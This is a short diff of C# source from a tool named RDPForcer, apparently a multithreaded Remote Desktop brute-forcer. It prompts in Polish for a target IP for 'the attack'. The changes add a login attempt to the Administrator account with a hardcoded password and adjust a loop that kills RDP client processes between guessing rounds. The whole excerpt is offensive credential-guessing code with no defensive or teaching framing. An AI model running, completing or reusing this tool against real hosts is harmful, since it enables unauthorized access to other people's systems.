@@ -21,6 +21,9 @@ namespace RDPForcer
             Console.WriteLine("{0}, Version {1}", assemName.Name, ver.ToString());
             Console.WriteLine("Podaj adres IP, na który przepuszczamy atak:");
             var ip = Console.ReadLine();
+            RDPClient client = new RDPClient();
+            client.ConnectToRemoteDesktop(("Administrator", ".", "dupadupa", ip));
+            Thread.Sleep(10000);
             for (int i=0;i< thredsnum;i++)
             {
                 RDPConnector connector = new RDPConnector(3389, ip,"Administrator");
@@ -33,8 +36,8 @@ namespace RDPForcer
             {
                 for(int i=0;i<thredsnum;i++)
                 {
-                    //czyszczenie
-                    String[] pNames = { "cmdkey", "conhost", "mstsc", "CredentialUIBroker" };
+                    //czyszczenie by nie zabić hosta
+                    String[] pNames = { "mstsc", "CredentialUIBroker" };
                     foreach(string name in pNames)
                     {
                         Process[] p = Process.GetProcessesByName(name);
